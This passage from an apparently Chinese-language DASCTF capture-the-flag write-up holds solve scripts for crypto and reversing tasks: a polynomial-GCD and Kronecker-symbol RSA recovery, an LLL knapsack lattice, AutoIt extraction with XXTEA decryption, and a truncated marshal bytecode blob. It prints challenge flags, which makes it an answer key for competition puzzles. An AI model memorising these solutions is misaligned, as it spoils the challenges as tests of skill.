class="string">(e1, noise1, c1) = (1743, 44560588075773853612820227436439937514195680734214431948441190347878274184937952381785302837541202705212687700521129385632776241537669208088777729355349833215443048466316517110778502508209433792603420158786772339233397583637570006255153020675167597396958251208681121668808253767520416175569161674463861719776, 65643009354198075182587766550521107063140340983433852821580802983736094225036497335607400197479623208915379722646955329855681601551282788854644359967909570360251550766970054185510197999091645907461580987639650262519866292285164258262387411847857812391136042309550813795587776534035784065962779853621152905983)</span></span><br><span class="line"><span class="string">(e2, noise2, c2) = (1325, 35282006599813744140721262875292395887558561517759721467291789696459426702600397172655624765281531167221787036009507833425145071265739486735993631460189629709591456017092661028839951392247601628468621576100035700437892164435424035004463142959219067199451575338270613300215815894328788753564798153516122567683, 50327632090778183759544755226710110702046850880299488259739672542025916422119065179822210884622225945376465802069464782311211031263046593145733701591371950349735709553105217501410716570601397725812709771348772095131473415552527749452347866778401205442409443726952960806789526845194216490544108773715759733714)</span></span><br><span class="line"><span class="string">c = 124349762993424531697403299350944207725577290992189948388824124986066269514204313888980321088629462472088631052329128042837153718129149149661961926557818023704330462282009415874674794190206220980118413541269327644472633791532767765585035518183177197863522573410860341245613331398610013697803459403446614221369</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这里比赛的时候大概明白这里的Jacobi的玄机 但是只是储备完全不够 瞎猜的几个结论也求不出p<br>求q的部分当时也以为e不同不能sage跑(虽说写了一个copper但好像写假了。。。 要再认真弄懂copper的原理)<br>先跑q:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n2))</span><br><span class="line">    g1 = (x+noise1)^e1-c1</span><br><span class="line">    g2 = (x+noise2)^e2-c2</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1,g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2,g1%g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1,g2)[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># print(attack())</span></span><br></pre></td></tr></table></figure><p>然后求p<br>首先了解kronecker符号<br><img src="https://s2.loli.net/2023/12/03/VSfdpxDN2AtmHkJ.png" alt="_KE8ATP818UNXM_L6_9A_P2.png"><br>由于Jacobi只是将勒让德的奇素数推广到了奇数<br>而kronecker符号是推广到了一般的整数 更具普适意义</p><p>两种情况</p><ul><li><code>(2x^2)^e</code> </li><li><code>(2x^2+1)^e</code></li></ul><p><img src="https://s2.loli.net/2023/12/03/m9Br3gGlnudUvAO.png" alt="AHYCN6UYNIUKOMT____HZPE.png"><br><font color=red size=5>不要忘了欧拉准则！！！二次剩余最初的判断方式！！！</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    i = <span class="built_in">int</span>(i)</span><br><span class="line">    <span class="keyword">if</span>(kronecker(i,n1)==<span class="number">1</span>):</span><br><span class="line">        p = <span class="string">&#x27;1&#x27;</span>+p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = <span class="string">&#x27;0&#x27;</span>+p</span><br><span class="line"><span class="comment"># print(int(p,2))</span></span><br></pre></td></tr></table></figure><p>或者这种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(kronecker(i,n1)==-<span class="number">1</span>):</span><br><span class="line">        p = <span class="string">&#x27;0&#x27;</span>+p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = <span class="string">&#x27;1&#x27;</span>+p</span><br></pre></td></tr></table></figure><p>最后的flag<br><img src="https://s2.loli.net/2023/12/03/4bwU5vxHVqXTBIs.png" alt="6R1Y1YM9VKF78ACQ__@FXF0.png"></p><h2 id="backpack"><a href="#backpack" class="headerlink" title="backpack"></a>backpack</h2><p>粗浅学了下格密码 看了看背包密码LLL破解的本质<br>还是要学会自己造格子<br>这题跟普通的背包不同在于 每6个中必有3个1<br>所以要再加上一列的约束 即 Σxi &#x3D; 24<br>借大佬的图<br><img src="https://s2.loli.net/2023/12/03/7WanPqKwBNDe2gX.png" alt="Y@V1GI@_GOC3F_LV8V_LY_H.png"><br>最后判断就是在常规的-S那列为0后加上最后一列为0<br>solution.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = [<span class="number">65651991706497</span>, <span class="number">247831871690373</span>, <span class="number">120247087605020</span>, <span class="number">236854536567393</span>, <span class="number">38795708921144</span>, <span class="number">256334857906663</span>, <span class="number">120089773523233</span>, <span class="number">165349388120302</span>, <span class="number">123968326805899</span>, <span class="number">79638234559694</span>, <span class="number">259559389823590</span>, <span class="number">256776519514651</span>, <span class="number">107733244474073</span>, <span class="number">216508566448440</span>, <span class="number">39327578905012</span>, <span class="number">118682486932022</span>, <span class="number">263357223061004</span>, <span class="number">132872609024098</span>, <span class="number">44605761726563</span>, <span class="number">24908360451602</span>, <span class="number">237906955893793</span>, <span class="number">204469770496199</span>, <span class="number">7055254513808</span>, <span class="number">221802659519968</span>, <span class="number">169686619990988</span>, <span class="number">23128789035141</span>, <span class="number">208847144870760</span>, <span class="number">272339624469135</span>, <span class="number">269511404473473</span>, <span class="number">112830627321371</span>, <span class="number">73203551744776</span>, <span class="number">42843503010671</span>, <span class="number">118193938825623</span>, <span class="number">49625220390324</span>, <span class="number">230439888723036</span>, <span class="number">241486656550572</span>, <span class="number">107149406378865</span>, <span class="number">233503862264755</span>, <span class="number">269502011971514</span>, <span class="number">181805192674559</span>, <span class="number">152612003195556</span>, <span class="number">184127512098087</span>, <span class="number">165959151027513</span>, <span class="number">188723045133473</span>, <span class="number">241615906682300</span>, <span class="number">216101484550038</span>, <span class="number">81190147709444</span>, <span class="number">124498742419309</span>]</span><br><span class="line">re = <span class="number">4051501228761632</span></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(a)</span><br><span class="line">K = <span class="number">2</span>^<span class="number">10</span></span><br><span class="line">M = Matrix(ZZ,n+<span class="number">1</span>,n+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    M[i,i] = <span class="number">1</span></span><br><span class="line">    M[i,n] = K*a[i]</span><br><span class="line">    M[i,n+<span class="number">1</span>] = K*<span class="number">1</span></span><br><span class="line">M[n,n] = -K*re</span><br><span class="line">M[n,n+<span class="number">1</span>] = -<span class="number">24</span>*K</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> M.LLL():</span><br><span class="line">    <span class="keyword">if</span>(line[-<span class="number">1</span>]==<span class="number">0</span> <span class="keyword">and</span> line[-<span class="number">2</span>]==<span class="number">0</span>):</span><br><span class="line">        x = [<span class="built_in">abs</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> line[:-<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">set</span>(x).issubset([<span class="number">0</span>, <span class="number">1</span>]):</span><br><span class="line">            <span class="built_in">print</span>(x)</span><br><span class="line">            flag = <span class="string">&#x27;DASCTF&#123;&#x27;</span>+sha256(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> x]).encode()).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/12/03/YjdHfbD6wquvmnB.png" alt="image.png"></p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="auuuu3"><a href="#auuuu3" class="headerlink" title="auuuu3"></a>auuuu3</h2><p>给的是一个autoit格式的exe<br>如果用IDA查看 基本上是做不出来的<br>万幸的是有个脚本可以帮我们extract<br><a href="https://github.com/nazywam/AutoIt-Ripper">https://github.com/nazywam/AutoIt-Ripper</a><br>然后这么用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> autoit_ripper <span class="keyword">import</span> extract, AutoItVersion</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;D:\浏览器下载\auuuu3.exe&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file_content = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># EA05 for v3.00+, EA06 for v3.26+</span></span><br><span class="line"><span class="comment"># Omitting `version` or passing None will try both versions</span></span><br><span class="line">content_list = extract(data=file_content, version=AutoItVersion.EA06)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;D:\浏览器下载\auuuu3.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> content <span class="keyword">in</span> content_list:</span><br><span class="line">        s = <span class="built_in">str</span>(content)</span><br><span class="line">        f.write(s)</span><br></pre></td></tr></table></figure><p>WP用的exe我没找到… 但是这样提取出来大致也能看<br>很容易定位到最后一部分<br><img src="https://s2.loli.net/2023/12/03/GAH385FJgWbe4xw.png" alt="image-1.png"><br>这里相当于load了一个dll 只是是用hex写的 我们将这段opcode导入dll用IDA来分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">OPCODE = <span class="string">&quotquot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;D:\浏览器下载\enc.dll&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(binascii.unhexlify(OPCODE))</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/12/03/o6lqvjngdYhQsIW.png" alt="ZZ_QD_HMMKFJ94TSU_~VHPT.png"><br>标准的xxtea加密</p><p>我们已知 ciphertext<code>7218181A02F79F4B5773E8FFE83FE732DF96259FF2B86AAB945468A132A83D83CF9D750E316C8675</code></p><p>key<code>Wowww111auUu3</code><br>小端序转一下 解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">10</span>]= &#123;<span class="number">0x1A181872</span>,<span class="number">0x4B9FF702</span>,<span class="number">0xFFE87357</span>,<span class="number">0x32E73FE8</span>,<span class="number">0x9F2596DF</span>,<span class="number">0xAB6AB8F2</span>,<span class="number">0xA1685494</span>,<span class="number">0x833DA832</span>,<span class="number">0x0E759DCF</span>,<span class="number">0x75866C31</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">0x77776f57</span>,<span class="number">0x31313177</span>,<span class="number">0x75557561</span>,<span class="number">0x33</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n= <span class="number">10</span>; </span><br><span class="line">    btea(v, -n, k);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">3</span>;j++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,(v[i]&gt;&gt;(<span class="number">8</span>*j))&amp;<span class="number">0xff</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag : <strong>DASCTF{Oh1_autO1t_iS_so_Co0oL_aNd_Fun}</strong><br>可以看到 这题主要考的其实是合理利用工具进行分析(找到autoit-ripper后的分析其实并不难 <del>但如果只会IDA就G了…</del>)</p><h2 id="marshal"><a href="#marshal" class="headerlink" title="marshal"></a>marshal</h2><p>题目给的一个嵌套marshal的py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">code = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00@\x00\x00\x00s\xe2\x00\x00\x00d\x00d\x01d\x02d\x03d\x04d\x05d\x06d\x07d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fg\x10Z\x00d\x10d\x11\x84\x00e\x01d\x12\x83\x01D\x00\x83\x01Z\x02d\x05d\x12d\x13d\x14d\x0ed\x15d\x16d\x17d\x0fd\x18d\x19d\x1ad\x08d\x1bd\x1cd\x1dd\x0cd\x1ed\x1fd d\x01d!d&quot;d#d\x02d$d%d&amp;d\rd\&#x27;d(d)d\x0bd*d+d,d\x04d-d.d/d\x06d0d1d2d\x03d3d4d5d\x00d6d7d8d\x07d9d:d;d\td&lt;d=d&gt;d\nd?d@dAg@Z\x03dBd\x11\x84\x00e\x01dC\x83\x01D\x00\x83\x01Z\x04e\x05\xa0\x06dD\xa1\x01Z\x07e\x08e\x07\x83\x01\x01\x00dES\x00)F\xe9\x0c\x00\x00\x00\xe9\x05\x00\x00\x00\xe9\x06\x00\x00\x00\xe9\x0b\x00\x00\x00\xe9\t\x00\x00\x00\xe9\x00\x00\x00\x00\xe9\n\x00\x00\x00\xe9\r\x00\x00\x00\xe9\x03\x00\x00\x00\xe9\x0e\x00\x00\x00\xe9\x0f\x00\x00\x00\xe9\x08\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x07\x00\x00\x00\xe9\x01\x00\x00\x00\xe9\x02\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00\xa9\x00)\x02\xda\x04Sbox\xda\x05index\xa9\x02\xda\x02.0\xda\x01xr\x10\x00\x00\x00r\x10\x00\x00\x00\xda\x00\xda\n&lt;listcomp&gt;\x04\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00r\x17\x00\x00\x00\xe9\x10\x00\x00\x00\xe9 \x00\x00\x00\xe90\x00\x00\x00\xe9\x11\x00\x00\x00\xe9!\x00\x00\x00\xe91\x00\x00\x00\xe9\x12\x00\x00\x00\xe9&quot;\x00\x00\x00\xe92\x00\x00\x00\xe9\x13\x00\x00\x00\xe9#\x00\x00\x00\xe93\x00\x00\x00\xe9\x14\x00\x00\x00\xe9$\x00\x00\x00\xe94\x00\x00\x00\xe9\x15\x00\x00\x00\xe9%\x00\x00\x00\xe95\x00\x00\x00\xe9\x16\x00\x00\x00\xe9&amp;\x00\x00\x00\xe96\x00\x00\x00\xe9\x17\x00\x00\x00\xe9\&#x27;\x00\x00\x00\xe97\x00\x00\x00\xe9\x18\x00\x00\x00\xe9(\x00\x00\x00\xe98\x00\x00\x00\xe9\x19\x00\x00\x00\xe9)\x00\x00\x00\xe99\x00\x00\x00\xe9\x1a\x00\x00\x00\xe9*\x00\x00\x00\xe9:\x00\x00\x00\xe9\x1b\x00\x00\x00\xe9+\x00\x00\x00\xe9;\x00\x00\x00\xe9\x1c\x00\x00\x00\xe9,\x00\x00\x00\xe9&lt;\x00\x00\x00\xe9\x1d\x00\x00\x00\xe9-\x00\x00\x00\xe9=\x00\x00\x00\xe9\x1e\x00\x00\x00\xe9.\x00\x00\x00\xe9&gt;\x00\x00\x00\xe9\x1f\x00\x00\x00\xe9/\x00\x00\x00\xe9?\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00r\x10\x00\x00\x00)\x02\xda\x04PBoxr\x12\x00\x00\x00r\x13\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00\t\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00\xe9@\x00\x00\x00s#\n\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 